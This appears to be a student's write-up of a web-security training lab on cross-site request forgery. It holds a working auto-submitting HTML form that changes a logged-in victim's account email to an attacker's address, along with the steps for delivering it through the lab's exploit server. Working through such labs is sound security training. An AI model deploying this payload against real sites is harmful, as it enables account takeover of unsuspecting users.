CSRF vulnerability with no defenses:

    -We use burp suite for this challenge to change the email in POST request.
    -Applications "/my-account/change-email" fails to implement any anti-CSRF measures. So it allow attacker to looged in and perform various functions
    - Create a HTML code that automatically submits a POST request to the target.
    <form method="POST" action="https://-0a860030048a042780de0c4801ac0076.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="attacker@evil-domain.com">
    </form>
    <script>
        document.forms[0].submit();
    </script>
    -Upload the code to the provided Exploit Server
    -Store it and view it. Deliver the exploit to the victim
